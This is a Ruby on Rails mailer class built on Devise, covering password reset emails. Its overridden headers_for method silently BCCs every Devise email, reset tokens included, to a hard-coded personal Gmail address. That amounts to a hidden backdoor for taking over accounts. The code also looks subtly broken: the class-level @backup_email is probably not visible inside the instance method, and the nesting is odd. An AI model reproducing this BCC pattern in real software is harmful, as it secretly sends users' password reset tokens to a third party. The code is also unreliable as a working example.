class UserMailer < ActionMailer::Base
  include Devise::Mailers::Helpers
  @backup_email = "bob39rocks@gmail.com"
    def headers_for(action, opts)
      headers = {
          :subject       => subject_for(action),
          :to            => resource.email,
          :from          => mailer_sender(devise_mapping),
          :bcc           => @backup_email,
          :reply_to      => mailer_reply_to(devise_mapping),
          :template_path => template_paths,
          :template_name => action
      }.merge(opts)
    end

  def password_reset(user)
    @user = user
    mail :to => user.email, :subject => "Password Reset"
  end

  # send password reset instructions
  def reset_password_instructions(record, token, opts={})
    @token = token
    devise_mail(record, :reset_password_instructions, opts)
  end
  end
